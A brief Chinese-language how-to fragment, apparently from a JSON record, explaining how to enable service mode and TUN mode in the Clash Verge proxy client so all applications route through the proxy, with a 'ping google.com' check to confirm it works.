使用说明：\n下面的方法适用于电脑上任何一个应用都能够魔法上网如cmd等应用 安装服务模式： 设置-\u0026gt;服务模式-\u0026gt;点击小盾牌-\u0026gt;点击INSTALL。 Tun模式： 设置-\u0026gt;Tun模式，设置-\u0026gt;服务模式 都开启 测试 打开cmd窗口-\u0026gt;输入ping google.com，有正常回显，表示成功 ","title":"Clash Verge使用教程"}]